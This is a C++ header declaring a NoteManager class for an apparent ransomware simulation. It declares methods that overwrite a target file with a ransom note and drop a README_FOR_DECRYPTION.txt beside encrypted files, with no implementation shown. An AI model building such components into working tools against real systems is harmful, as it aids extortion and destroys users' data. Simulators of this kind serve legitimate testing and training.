#pragma once
#include <string>

class NoteManager {
public:
    NoteManager() = default;

    // Overwrite the provided path with a simulation ransom-note (original content replaced)
    bool createNoteOverwrite(const std::string& targetPath, const std::string& hint = "") const;

    // Create a README_FOR_DECRYPTION.txt next to the encrypted file (does not overwrite)
    bool createNoteNextToEncrypted(const std::string& encryptedPath, const std::string& hint = "") const;

private:
    std::string buildNoteText(const std::string& target, const std::string& hint) const;
};